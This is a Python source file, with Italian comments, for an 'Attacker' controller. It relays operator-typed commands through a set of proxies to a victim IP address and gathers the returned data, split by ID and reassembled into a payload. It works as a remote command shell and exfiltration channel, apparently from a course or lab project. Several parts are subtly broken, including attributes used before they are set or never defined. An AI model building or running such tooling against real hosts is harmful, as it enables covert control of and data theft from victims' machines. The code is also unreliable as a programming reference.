import ipaddress
import sys 
import os  
import random
import threading  

from custom_enum import SEPARAZIONE_DATI, ENTITY
from attacksingleton import *  

#file_path = "./attacksingleton.py"
#directory = os.path.dirname(file_path)
#sys.path.insert(0, directory)
#import attacksingleton 

class Attacker: 
    def __init__(self, config_args:ARGS_CONFIG.FROM_FILE): 
        if not isinstance(config_args, ARGS_CONFIG.FROM_FILE):
            raise TypeError("config_args non valido")
        self.ip_vittima=config_args.ip_vittima 
        self.ip_host=config_args.ip_host 
        self.attack_type=config_args.attack_type 
        self.lock_proxy_list:threading.Lock=get_threading_Lock() 
        self.proxy_list:dict[str,DATA.PROXY]=dict() 
        for proxy in config_args.proxy_list : 
            if not is_ipaddress(proxy): 
                #proxy_list.remove(proxy) 
                print(f"\t{proxy} non è un indirizzo valido") 
                continue 
            if not self.proxy_list.get(proxy.compressed): 
                self.proxy_list[proxy.compressed]=DATA.PROXY(proxy,self.proxy_port) 
        self.proxy_port=config_args.proxy_port 
        self.dati_ricevuti={} 
    
    def start(self): 
        def send_command(): 
            chosen_proxy=random.choice(self.proxy_list.values()) 
            if not isinstance(chosen_proxy, DATA.PROXY): 
                raise TypeError("Proxy non DATA.PROXY") 
            print(f"Il comando verrà mandato al proxy {chosen_proxy}") 
            with self.lock_proxy_list: 
                socket= self.proxy_list[chosen_proxy.ipaddress.compressed].socket
            messaggio=(
                MSG.CONFIRM_COMMAND.value+
                command+
                MSG.END_SOCKETSEND.value
            )
            socket.sendall(messaggio.encode()) 
            print(f"Gli altri proxy ascolteranno direttamente la vittima")
            for proxy in self.proxy_list.values(): 
                if proxy.ipaddress.compressed==chosen_proxy.ipaddress.compressed:
                    continue 
                with self.lock_proxy_list:
                    socket= self.proxy_list[proxy.ipaddress.compressed].socket
                socket.sendall(MSG.WAIT_DATA.value.encode())  
        def get_received_data(): 
            received_data=[]
            with self.lock_proxy_list: 
                for proxy in self.proxy_list.values(): 
                    with proxy.data_lock: 
                        received_data.extend(proxy.data_received) 
            return received_data 
        def reset_variables(): 
            self.thread_list={}
            self.dati_separati={}
            #self.data_received:dict[str,list]={}
            for proxy in self.proxy_list: 
                if not isinstance(proxy, ipaddress.IPv4Address) and not isinstance(proxy, ipaddress.IPv6Address):
                    print(f"***\t{proxy} non è un indirizzo valido")
                    continue
                self.data_received.update({proxy.compressed:[]}) 
                thread=threading.Thread(
                    target=self.wait_data_from_proxy 
                    ,args=[proxy]
                )
                thread.name=f"Thread-{proxy.compressed}"
                self.thread_list.update({proxy.compressed:thread})
            for proxy in self.proxy_list:
                self.event_thread_update.get(proxy.compressed).clear() 
            for thread in self.thread_list.values():
                thread.start() 
            #if want_to_choose_new_attack():
            #    self.attack_function=choose_new_attack() 
            #if want_to_choose_new_victim:
            #   self.ip_vittima= choose_new_victim()  
        #------------------------ 
        self.thread_proxiesConnection=PROXIES_CONECTION(self.proxy_list, self.proxy_port, self.lock_proxy_list) 
        self.thread_proxiesConnection.start(
            self.ip_vittima,self.attack_type
        )  
        print(f"Got all connected proxy") 
        if len(self.proxy_list)<=0: 
            print("Nessun Proxy disponibile")
            exit(0) 
        self.thread_waitData=WAIT_DATA(self.proxy_list) 
        self.thread_waitData.start(self.proxy_list) 
        msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
        command=input(msg) 
        while command.lower() not in exit_cases: 
            print(f"Il comando immesso è: {command}") 
            try: 
                send_command() 
                print("Attesa dei dati dai proxy...") 
                for thread in self.thread_waitData.values(): 
                    thread.join() 
                print("Tutti i dati ricevuti dai proxy") 
                self.data_received=get_received_data() 
                print("Dati ricevuti: ",self.data_received) 
                self.dati_separati= DATA.METHODS.separa_dati(SEPARAZIONE_DATI.ID, self.data_received) 
                print("Dati separati: ",self.dati_separati) 
                #print("\n***dati_separati: ", self.dati_separati) 
                print("Dati separati per Sequenza")    
                payload=DATA.METHODS.unisci_dati(self.dati_separati)
                print(payload) 
                #reset thread and reset data_received
                reset_variables()
                command=input(msg) 
            except Exception as e: 
                print(e) 
                exit(-1)
        print("Uscita dalla shell\texit")  
        for proxy in self.proxy_list.values(): 
            with self.lock_proxy_list:
                socket_proxy=self.proxy_list.get(proxy.compressed).socket 
            try: 
                socket_proxy.sendall(MSG.END_COMMUNICATION.value.encode()) 
                socket_proxy.close() 
            except Exception as e: 
                print(f"send_command_to_victim-> ",e)
                print(f"Errore durante la chiusura della connessione con proxy {proxy}")

if __name__=="__main__": 
    args=ARGS_CONFIG.FROM_COMMAND(ENTITY.ATTACKER).args
    if not is_namespace(args): 
        exit(-1) 
    if not is_string(args.file_path):
        config_args=ARGS_CONFIG.FROM_FILE(args.file_path) 
    else: config_args=ARGS_CONFIG.FROM_FILE(None) 
    attacker=Attacker(config_args) 
    attacker.start()
